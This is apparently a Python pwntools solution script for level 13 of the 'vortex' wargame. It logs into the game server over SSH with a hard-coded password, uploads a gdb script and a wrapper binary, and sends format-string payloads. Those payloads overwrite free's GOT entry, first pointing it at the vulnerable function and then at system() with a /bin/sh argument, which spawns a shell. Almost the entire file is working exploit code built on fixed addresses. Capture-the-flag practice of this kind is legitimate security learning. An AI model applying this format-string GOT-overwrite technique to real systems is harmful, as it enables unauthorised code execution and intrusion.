from textwrap import wrap

from pwn import *
from random import randint
from time import sleep
import uuid

local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None

BINARY_PATH = None
CWD = None
LOCAL = None
EXECUTE = False

def pad(s, slen):
    return s + b"X" * (slen - len(s))


def connect(level, password, init=True):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global LOCAL
    compose_download_paths(level)
    port = 2228
    connected = False
    s = None
    while not connected:
        try:
            s = ssh("vortex" + level, "176.9.9.172", password=password, cache=True, port=port)
            connected = True
            log.info("connected")
            if init:
                s.libs(remote_binary, local_dir)
        except Exception as e:
            log.info("ssh connection attempt failed")
            print("error: {0}".format(e))
            sleep(randint(1, 5))
    load_downloaded_files()
    LOCAL = False
    CWD = "/tmp/"
    BINARY_PATH = "/vortex/vortex" + level
    return s


# function of local testing vm
def connect_to_local(level, password, remote=True):
    global CWD
    global LOCAL
    global BINARY_PATH
    global local_dir
    if remote:
        connect(level, password)
    else:
        compose_download_paths(level)
        load_downloaded_files()
    s = ssh("kali", "127.0.0.1", keyfile="/home/kali/.ssh/id_rsa", cache=True)
    CWD = local_dir + "/vortex"
    BINARY_PATH = CWD + "/vortex" + level
    LOCAL = True
    return s


def load_downloaded_files():
    global elf
    global libc
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"


def compose_download_paths(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"
    log.info(f"cloned_binary: {local_binary}")


def goto_bash(s, before_func=None, menu_func=None, execute=None):
    done = "0"
    while done == "0":
        if before_func:
            before_func()
        sh = s.process(["sh"])
        if execute:
            sh.sendline(execute)
        sh.interactive()
        done = input("done with sh, done?").replace("\n", "")
        if done == "2":
            menu_func()


def upload(s, content, remote_path):
    temp_path = "/tmp/" + str(uuid.uuid4())
    write(temp_path, content)
    s.upload(temp_path, remote_path)
    rm = process(["rm", "-rf", temp_path])
    rm.recvall()


def append_to_remote_file(s, content, remote_path):
    temp_path = "/tmp/" + str(uuid.uuid4())
    s.download(remote_path, temp_path)
    old = read(temp_path)
    # new = old + b"\n" + content
    new = old + content
    write(temp_path, new)
    s.upload(temp_path, remote_path)
    rm = process(["rm", "-rf", temp_path])
    rm.recvall()


gdb_script = '''
set follow-fork-mode child
set disassembly-flavor intel   
alias gil = disassemble

#alias gili = x/2i
#alias gilr = 'x/2wx $ebp'

unset env
show env

# break at main
b *main
shell sleep 0.5
# run wrapper with symlink as arg, pipe input later into forked vortex process
r `cat /tmp/docgil-raw` < /tmp/docgil
shell sleep 0.5
b *execve
shell sleep 0.5
c
shell sleep 0.5
si
shell sleep 0.5
si
shell sleep 0.5
del
shell sleep 0.5
break *main
shell sleep 0.5
c
shell sleep 0.5
# now in main from vortex prog
b *exit
b *printf
b *fgets




shell echo "show ebp"
b *0x0804859d
c
i r ebp




# c
# shell sleep 0.5
# c
# shell sleep 0.5
# c
# shell echo "frees got updated"
# shell sleep 0.5
# 
# 
# 
# c
# shell sleep 0.5
# c
# shell sleep 0.5
# c
# shell echo "now at printf for big payload"
# shell echo "buf:"
# x/s 0x804c600
# 
# shell sleep 0.5
# finish
# 
# shell echo "updated free.got"
# x/1wx 0x0804a010
# 
# shell echo "arg of system aka free.got"
# x/1wx 0xffffde0c
# 
# si
# shell sleep 0.5
# si
# shell sleep 0.5
# si


'''

def send_fs_payload(io, fs):
    io.send(fs)
    r = io.recv(numb=1000000000, timeout=1000000)
    log.info("done receiving")
    return io


# s = connect_to_local("13", "jMyg12=nB", remote=False)
s = connect("13", "jMyg12=nB")

# gdb -x /tmp/gdb /tmp/wrapper /vortex/vortex13

cmd = "gdb -x /tmp/gdb /vortex/vortex13"
wrapper_path = local_dir + "/vortex/wrapper"
wrapper_src_path = local_dir + "/vortex/wrapper.cpp"
remote_wrapper_path = "/tmp/wrapper"
remote_payload_path = "/tmp/docgil-raw"
remote_format_payload_path = "/tmp/docgil"
if LOCAL:
    remote_gdb_script_path = local_dir + "/vortex/gdb.script"
else:
    remote_gdb_script_path = "/tmp/gdb"

# after 14 is initialized as local var
vuln_adr = 0x0804859a
free_got = 0x0804a010
printf_got = 0x804a00c
system_adr = 0xf7e0b040
bin_sh_p = 0xf7f52338
fs_payload_size = 0x13

ebp = 0xffffde18
# ebp-0x10
malloc_arg_p = ebp-0x10
# ebp-c
local_var_buf_p = ebp-0xc

# heap_fs_buf_adr = 0x804b1a0
#  "%1002x%x%1232xZZ"

# malloc ret adrs:
# 0x804b1a0




log.info(
    "############################################################################################################################################################")
log.info("# Init payload symlink file")
log.info(
    "############################################################################################################################################################")
upload(s, gdb_script, remote_gdb_script_path)

symlink = None

if LOCAL:
    process(["rm", "/tmp/docgil"])


def to_ascii_bytes(number):
    return bytes(str(number), "utf-8")


def cleanup():
    s.process(["rm", symlink])


def init_and_upload_payload(payload):
    global symlink
    symlink = payload
    if LOCAL:
        s.set_working_directory(bytes(CWD, "utf-8"))
        s.ln(['-s', BINARY_PATH, symlink])
    else:
        s.process(['ln', '-s', BINARY_PATH, symlink], cwd=CWD)
    upload(s, payload, remote_payload_path)
    hexdump = s.process(["hexdump", "-C", remote_payload_path]).recvall()
    upload(s, hexdump, "/tmp/link-hexdump")
    log.info(f"hexdump: {hexdump}")


log.info(
    "############################################################################################################################################################")
log.info("# find hammerlen")
log.info(
    "############################################################################################################################################################")

# printf arg pointer = 0xffffddec

def create_payload():
    payload = b""
    payload += b"A"
    payload += b"B"
    payload += pack(free_got, 32)
    payload += pack(malloc_arg_p, 32)
    payload += pack(free_got, 32)
    payload += pack(free_got+2, 32)
    payload += pack(free_got+2, 32)

    payload += pack(local_var_buf_p, 32)
    payload += pack(local_var_buf_p, 32)
    payload += pack(local_var_buf_p, 32)

    payload += pack(local_var_buf_p+2, 32)
    # payload += pack(local_var_buf_p+2, 32)

    payload += b"DDD"
    return payload


payload = create_payload()
init_and_upload_payload(payload)

process(["gcc", "-no-pie", "-m32", wrapper_src_path, "-o", wrapper_path]).recvall()
s.upload(wrapper_path, remote_wrapper_path)
s.process(["chmod", "a+x", remote_wrapper_path])


def execute():
    if LOCAL:
        return s.process(["env", "-i", "setarch", "-R", remote_wrapper_path, symlink])
    else:
        return s.process(["env", "-i", remote_wrapper_path, symlink])


def execute_format_payload_peek(i):
    log.info(f"i: {i}")
    f_payload = b""
    f_payload += b"%" + to_ascii_bytes(i) + b"$p"
    f_payload += b"."
    f_payload += b"%" + to_ascii_bytes(i+1) + b"$p"
    f_payload = pad(f_payload, fs_payload_size)

    log.info(f"f_payload: {f_payload}")

    io = execute()
    io.send(f_payload)
    r = io.recvall()
    log.info(f"r: {r}")
    return r


def find_off_until_payload(target_value):
    # to shorten things we start from 100
    for i in range(100, 150):
        r = execute_format_payload_peek(i)
        log.info(f"pack(free_got, 32): {pack(free_got, 32,endianness='big')}")
        # free got
        if r.startswith(target_value):
            log.info(f"found index, start of buf at {i}")
            return i


def create_fs_paylad(padding, target, h=False, limit_pad=True):
    format_payload = b""
    format_payload += b"%" + to_ascii_bytes(
        padding
    ) + b"x"

    if h:
        format_payload += b"%" + to_ascii_bytes(
            target
        ) + b"$hn"
    else:
        format_payload += b"%" + to_ascii_bytes(
            target
        ) + b"$n"
    if limit_pad:
        assert len(format_payload) <= 0x13
        return pad(format_payload, fs_payload_size)
    else:
        return format_payload


# off_until_payload = find_off_until_payload(b"0x804a010")
# always stays the same (aslr disabled)
off_until_payload = 120
# exit(1)
log.info(
    "############################################################################################################################################################")
log.info("# overwrite free's got to point to vuln")
log.info(
    "############################################################################################################################################################")

# allowed = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%.$\n"
# a = []
# for c in allowed:
#     a.append(ord(c))
# print(a)

# example fs
# %2044x%10$hn%38912x%11$hn

format_payload = create_fs_paylad(vuln_adr, off_until_payload)

log.info(f"format_payload: {format_payload}")
log.info(f"format_payload len: {len(format_payload)}")


append_to_remote_file(s, format_payload, remote_format_payload_path)

# 0xf7de37cb gets
if EXECUTE:
    io = execute()
    send_fs_payload(io, format_payload)

log.info("############################################################################################################################################################")
log.info("# overwrite malloc size var")
log.info("############################################################################################################################################################")
new_malloc_size = 0x100
format_payload = create_fs_paylad(new_malloc_size, off_until_payload+2)

log.info(f"format_payload: {format_payload}")
log.info(f"format_payload len: {len(format_payload)}")


append_to_remote_file(s, format_payload, remote_format_payload_path)
if EXECUTE:
    send_fs_payload(io, format_payload)

log.info("############################################################################################################################################################")
log.info("# update frees got to system and frees arg to binshP")
log.info("############################################################################################################################################################")

# SYSTEM ############################################################
# 0xf7e0 b040
# b040
already_padded = 0
new_padding = already_padded + 0xb040
format_payload = create_fs_paylad(new_padding, off_until_payload+4, h=True, limit_pad=False)

# 0xf7e0
already_padded = new_padding  # b040
new_padding = 0xf7e0 - already_padded
format_payload += create_fs_paylad(new_padding, off_until_payload+6, h=True, limit_pad=False)


# 0xffffde1c -> BINSH ##############################################################
# binsh : 0xf7f5 2338
# 2338
already_padded = 0xb040+(0xf7e0-0xb040)     # 0xf7e0
new_padding = 0x12338-already_padded    # 0x2b58
format_payload += create_fs_paylad(new_padding, off_until_payload+8, h=False, limit_pad=False)
#
# # 0xf7f5
already_padded = 0xf7e0 + 0x2b58     # 0x12238
new_padding = 0x1f7f5-already_padded    # 0xd5bd
format_payload += create_fs_paylad(new_padding, off_until_payload+10, h=False, limit_pad=False)

format_payload = pad(format_payload, new_malloc_size-1)


log.info(f"format_payload: {format_payload}")
log.info(f"format_payload len: {len(format_payload)}")
append_to_remote_file(s, format_payload, remote_format_payload_path)

log.info("malloc_arg_p: " + hex(malloc_arg_p))
log.info("local_var_buf_p: " + hex(local_var_buf_p))

if EXECUTE:
    io = send_fs_payload(io, format_payload)
    io.interactive()
else:
    goto_bash(s)

# r = io.recv()
# log.info("done receiving")



# log.info("############################################################################################################################################################")
# log.info("# send sh\\n to execute shell")
# log.info("############################################################################################################################################################")
#
#
# format_payload = pad(b"sh\n", new_malloc_size-1)
# append_to_remote_file(s, format_payload, remote_format_payload_path)
#
#
# io.send(format_payload)
# io.interactive()

# printf makes free point to system and ebp-c point to /bin/sh pointer